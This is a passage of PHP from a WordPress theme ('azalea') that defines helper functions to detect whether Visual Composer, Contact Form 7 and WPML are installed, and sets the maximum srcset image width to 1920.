        //is Visual Composer installed?
        if (class_exists('WPBakeryVisualComposerAbstract')) {
            return true;
        }

        return false;
    }
}

if (!function_exists('azalea_eltdf_contact_form_7_installed')) {
    /**
     * Function that checks if contact form 7 installed
     * @return bool
     */
    function azalea_eltdf_contact_form_7_installed() {
        //is Contact Form 7 installed?
        if (defined('WPCF7_VERSION')) {
            return true;
        }

        return false;
    }
}

if (!function_exists('azalea_eltdf_is_wpml_installed')) {
    /**
     * Function that checks if WPML plugin is installed
     * @return bool
     *
     * @version 0.1
     */
    function azalea_eltdf_is_wpml_installed() {
        return defined('ICL_SITEPRESS_VERSION');
    }
}

if (!function_exists('azalea_eltdf_max_image_width_srcset')) {
    /**
     * Set max width for srcset to 1920
     *
     * @return int
     */
    function azalea_eltdf_max_image_width_srcset() {
        return 1920;
    }

    add_filter('max_srcset_image_width', 'azalea_eltdf_max_image_width_srcset');
}